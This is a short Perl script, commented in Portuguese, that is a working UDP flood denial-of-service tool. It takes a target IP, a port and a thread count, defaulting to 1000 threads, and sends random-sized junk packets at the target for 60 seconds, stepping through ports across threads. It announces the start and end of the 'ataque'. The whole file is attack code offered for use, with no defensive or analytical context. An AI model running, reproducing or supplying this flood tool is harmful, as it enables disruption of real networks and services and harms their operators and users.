#!/usr/bin/perl
use Socket;
use strict;
use Time::HiRes qw(usleep);
use threads;
use threads::shared;

my $ip = $ARGV[0];
my $port = $ARGV[1] || 80;
my $threads = $ARGV[2] || 1000; # Número de threads para saturar
my $endtime = time() + 60; # Ataque por 60 segundos

sub flood {
    my ($ip, $port) = @_;
    my $iaddr = inet_aton($ip) or die "IP inválido\n";
    my $sockaddr = sockaddr_in($port, $iaddr);
    socket(my $socket, PF_INET, SOCK_DGRAM, 17);
    while (time() < $endtime) {
        my $psize = int(rand(1400) + 600); # Pacotes grandes variados
        send($socket, pack("a$psize", "0" x $psize), 0, $sockaddr);
        usleep(100); # Delay mínimo para não travar o kernel
    }
    close($socket);
}

print "Iniciando ataque com $threads threads...\n";
my @threads;
for (my $i = 0; $i < $threads; $i++) {
    push @threads, threads->create(\&flood, $ip, $port + $i);
}
$_->join for @threads;
print "Ataque finalizado.\n";